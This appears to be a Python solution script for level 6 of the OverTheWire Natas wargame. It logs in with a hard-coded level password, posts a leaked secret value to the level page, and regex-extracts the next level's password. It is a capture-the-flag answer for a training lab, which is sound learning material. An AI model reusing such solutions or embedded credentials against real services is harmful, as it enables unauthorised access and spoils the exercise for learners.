import requests
import re

username = 'natas6'
password = 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'

url = f'http://{username}.natas.labs.overthewire.org'

data = { 'secret' : 'FOEIUWGHFEEUHOFUOIU', 'submit' : 'hi' }

response = requests.post(url, data = data, auth = (username, password))
content = response.text

print(re.findall('The password for natas7 is (.*)', content)[0])